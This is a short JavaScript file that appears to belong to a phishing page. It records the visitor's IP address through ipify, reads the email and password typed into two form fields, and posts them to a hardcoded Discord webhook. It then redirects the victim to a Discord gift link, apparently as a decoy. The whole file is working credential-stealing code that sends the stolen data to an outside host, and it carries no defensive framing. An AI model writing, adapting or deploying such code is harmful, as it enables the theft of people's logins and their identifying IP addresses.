const whurl = 'https://discord.com/api/webhooks/1136396363249234011/210ZaTPoSO7Sl0q98jm-4-mP7malsIo1sSgmHncdOT0JDU_FHrNJJOhOVGuy0o17__yr';

let clientIp;
fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => clientIp = data.ip);

fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => clientIp = data.ip);

function balls(){
    const msg = {
        'content': 'Ip: ' + clientIp + '\n'
                    + 'Email: ' + document.getElementById('187').value + '\n'
                    + 'Password: ' + document.getElementById('287').value
    };

    fetch(whurl, {"method":"POST", "headers": {"content-type": "application/json"},"body": JSON.stringify(msg)});

    setTimeout(() => {  window.location.replace("https://discord.com/gifts/fd732d"); }, 500);
}
